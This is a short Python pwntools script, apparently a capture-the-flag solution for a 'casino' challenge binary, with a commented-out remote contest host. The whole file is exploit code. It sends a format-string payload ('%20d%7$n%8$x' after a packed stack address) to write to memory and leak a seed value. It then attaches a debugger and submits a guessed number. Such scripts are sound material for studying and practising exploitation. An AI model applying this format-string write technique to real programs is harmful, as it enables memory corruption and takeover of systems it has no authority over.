from pwn import *

context.log_level='debug'
sh = process('./casino')
#sh = remote("challs.fireshellsecurity.team","31006")
cover_addr = 0x7fffffffddb8
pay = p64(cover_addr) +'%20d%7$n%8$x'
print len(pay)

sh.recvuntil('What is your name? ')
sh.send(pay)
#sh.send("%8$x")
sh.recvuntil('Welcome ')
seed = sh.recvuntil('\n')[:-1]
print seed
gdb.attach(sh)

random = raw_input() 
sh.recvuntil('Guess my number: ')
sh.send(random)

sh.interactive()
